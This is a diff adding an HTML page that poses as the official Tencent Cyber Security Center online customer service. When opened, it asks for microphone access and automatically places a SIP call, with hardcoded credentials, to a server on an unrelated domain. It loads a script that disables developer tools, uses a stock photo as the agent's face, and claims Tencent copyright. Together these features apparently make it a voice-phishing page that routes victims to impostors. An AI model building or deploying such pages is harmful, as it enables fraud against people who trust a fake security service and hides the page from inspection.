@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>腾讯网络安全中心在线客服</title>
+  <style>
+    :root {
+      --main-blue: #2685fa;
+      --main-blue-dark: #1756a9;
+      --main-blue-light: #eaf3fe;
+      --main-gray: #f5f7fa;
+      --main-font: 'PingFang SC', 'Microsoft YaHei', Arial, sans-serif;
+      --border-radius: 14px;
+    }
+    body {
+      font-family: var(--main-font);
+      background: linear-gradient(135deg, var(--main-blue-light) 0%, #fff 100%);
+      min-height: 100vh;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+    }
+    .logo-box {
+      margin-top: 36px;
+      margin-bottom: 18px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .logo-box img {
+      height: 60px;
+      margin-bottom: 10px;
+    }
+    .main-content {
+      background: #fff;
+      box-shadow: 0 4px 24px 0 rgba(38,133,250,0.10);
+      border-radius: var(--border-radius);
+      padding: 36px 32px 32px 32px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-width: 340px;
+      max-width: 96vw;
+      margin-bottom: 28px;
+    }
+    .profile-avatar {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      object-fit: cover;
+      box-shadow: 0 2px 8px rgba(38,133,250,0.15);
+      border: 2px solid var(--main-blue-light);
+      margin-bottom: 18px;
+      margin-top: -10px;
+      background: #fff;
+    }
+    h1 {
+      font-size: 28px;
+      color: var(--main-blue-dark);
+      margin: 0 0 26px 0;
+      letter-spacing: 2px;
+      font-weight: 700;
+    }
+    #hangupButton {
+      background: linear-gradient(90deg, #ee4747 0%, #ff8888 100%);
+      color: #fff;
+      padding: 16px 44px;
+      font-size: 20px;
+      margin: 12px 10px;
+      border: none;
+      border-radius: 28px;
+      cursor: pointer;
+      font-weight: 600;
+      box-shadow: 0 2px 6px rgba(38,133,250,0.08);
+      transition: background 0.2s, box-shadow 0.2s;
+      outline: none;
+      user-select: none;
+      display: none;
+    }
+    #hangupButton:disabled {
+      background: #ffcccc;
+      color: #fff;
+      cursor: not-allowed;
+    }
+    #callStatus {
+      font-size: 17px;
+      margin-top: 16px;
+      color: var(--main-blue-dark);
+      letter-spacing: 1px;
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 16px;
+      color: #666;
+      text-align: center;
+      line-height: 1.8;
+      width: 100%;
+      max-width: 460px;
+      padding: 0 14px 40px 14px;
+    }
+    .footer strong {
+      color: var(--main-blue-dark);
+    }
+    @media (max-width: 500px) {
+      .main-content {
+        padding: 22px 6vw 18px 6vw;
+        min-width: unset;
+      }
+      h1 {
+        font-size: 22px;
+      }
+      .profile-avatar {
+        width: 48px;
+        height: 48px;
+      }
+      #hangupButton {
+        width: 92vw;
+        font-size: 17px;
+        margin: 10px 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="logo-box">
+    <img src="https://static.weibocdn.com/assets/img/brand/webao_logo_blue.svg" alt="腾讯网络安全中心LOGO" onerror="this.style.display='none'">
+  </div>
+
+  <div class="main-content">
+    <h1>腾讯网络安全中心在线客服</h1>
+    <img class="profile-avatar" src="https://randomuser.me/api/portraits/women/44.jpg" alt="客服头像" />
+    <div id="callStatus">准备呼叫中...</div>
+    <button id="hangupButton" onclick="hangupCall()" disabled>🛑 挂断</button>
+    <audio id="audioRemote" autoplay></audio>
+  </div>
+
+  <div class="footer">
+    <strong>温馨提示：</strong><br>
+    您正在使用腾讯网络安全中心官方在线客服。页面打开后将自动呼叫客服，<br>
+    请允许麦克风权限以便通话。<br>
+    如需结束通话，请点击“挂断”按钮。<br>
+    客服服务时间：9:00-21:00（节假日无休）<br>
+    <span style="color:#a3a3a3;font-size:13px;display:block;margin-top:8px;">© 2025 腾讯网络安全中心 版权所有</span>
+  </div>
+
+  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
+  <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", async function () {
+      const statusDisplay = document.getElementById('callStatus');
+      const remoteAudio = document.getElementById('audioRemote');
+      const hangupButton = document.getElementById('hangupButton');
+
+      function updateStatus(text) {
+        statusDisplay.textContent = text;
+      }
+
+      try {
+        updateStatus('请求麦克风权限...');
+        await navigator.mediaDevices.getUserMedia({ audio: true });
+      } catch (err) {
+        updateStatus('请允许麦克风权限，否则无法呼叫客服');
+        alert('请允许麦克风权限，否则无法呼叫客服');
+        return;
+      }
+
+      const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');
+      const configuration = {
+        sockets: [socket],
+        uri: 'sip:1002020@xin.anjre.cn',
+        password: 'Aa6363463@',
+        display_name: '腾讯网络安全中心',
+        session_timers: false,
+        register: true
+      };
+
+      const ua = new JsSIP.UA(configuration);
+      let session = null;
+
+      ua.on('connected', () => console.log('已连接到 SIP WebSocket'));
+      ua.on('registered', () => {
+        console.log('✅ 注册成功');
+        updateStatus('已注册，正在呼叫客服...');
+
+        if (!session || session.isEnded()) {
+          session = ua.call('sip:999999@xin.anjre.cn', {
+            mediaConstraints: { audio: true, video: false },
+            rtcOfferConstraints: {
+              offerToReceiveAudio: 1,
+              offerToReceiveVideo: 0
+            }
+          });
+
+          session.connection.addEventListener('addstream', function (e) {
+            remoteAudio.srcObject = e.stream;
+            remoteAudio.play().catch(err => console.warn('自动播放失败:', err));
+          });
+
+          session.on('progress', () => updateStatus("正在为您接通客服..."));
+          session.on('accepted', () => {
+            updateStatus("客服通话中");
+            hangupButton.disabled = false;
+            hangupButton.style.display = 'inline-block';
+          });
+          session.on('ended', () => {
+            updateStatus("通话已结束，感谢您的使用！");
+            hangupButton.disabled = true;
+            hangupButton.style.display = 'none';
+            ua.stop();
+          });
+          session.on('failed', (e) => {
+            updateStatus("呼叫失败，请稍后重试");
+            console.error('呼叫失败:', e);
+            hangupButton.disabled = true;
+            hangupButton.style.display = 'none';
+            ua.stop();
+          });
+        }
+      });
+
+      ua.on('registrationFailed', e => {
+        console.error('❌ 注册失败', e);
+        updateStatus('注册失败，请检查账号密码和服务器');
+      });
+      ua.on('disconnected', () => {
+        console.log('❗️ WebSocket 断开');
+        updateStatus('网络断开，请刷新重试');
+      });
+
+      ua.start();
+
+      window.hangupCall = function () {
+        if (session) {
+          session.terminate();
+          hangupButton.disabled = true;
+          hangupButton.style.display = 'none';
+        }
+      };
+
+      // 👉 页面关闭或刷新前自动挂断通话
+      window.addEventListener('beforeunload', function () {
+        if (session && !session.isEnded()) {
+          session.terminate();
+        }
+        if (ua && ua.isRegistered()) {
+          ua.stop();
+        }
+      });
+    });
+  </script>
+</body>
+</html>
